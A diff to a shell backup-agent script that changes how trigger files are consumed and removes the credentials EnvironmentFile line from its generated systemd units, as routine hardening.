-    run)       rm -f "$BACKUP_DIR/run-requested";  do_run ;;
-    test)      rm -f "$BACKUP_DIR/test-requested"; do_test ;;
-    configure) do_configure ;;
-    ack-key)   rm -f "$BACKUP_DIR/ack-key-requested"; do_ack_key ;;
+    configure) do_configure; return ;;
+    run|test|ack-key) ;;
     *) die "unknown trigger '$kind' (use: run | test | configure | ack-key)" ;;
+  esac
+  # These three carry no payload: the file is consumed (moved out of the
+  # shared directory, whatever it is — a symlink or a directory would otherwise
+  # survive `rm -f` and keep the .path unit firing) and never read.
+  if f="$(consume_trigger "$kind")"; then rm -f -- "$f"; fi
+  case "$kind" in
+    run)     do_run ;;
+    test)    do_test ;;
+    ack-key) do_ack_key ;;
   esac
 }
 
 # --- install-units ------------------------------------------------------------
-# Written inline so $DATA_DIR is baked in, same as the update timer.
+# Written inline so $DATA_DIR is baked in, same as the update timer. No
+# EnvironmentFile= any more: the agent reads backup.env itself (load_backup_env),
+# and a unit that parsed a credentials file into the service's environment was
+# a second reader of a file that is now meant to have exactly one.
 install_units() {
   ensure_backup_dir
   mkdir -p "$SYSTEMD_DIR"
@@ -1380,7 +1634,6 @@ Wants=network-online.target
 
 [Service]
 Type=oneshot
-EnvironmentFile=-$BACKUP_ENV
 Environment=DATA_DIR=$DATA_DIR
 ExecStart=$DATA_DIR/backup.sh run
 # The repository is remote and the box is a single node: a run that hangs on a
@@ -1417,7 +1670,6 @@ Wants=network-online.target
 
 [Service]
 Type=oneshot
-EnvironmentFile=-$BACKUP_ENV
 Environment=DATA_DIR=$DATA_DIR
 ExecStart=$DATA_DIR/backup.sh handle-trigger $kind
 TimeoutStartSec=6h
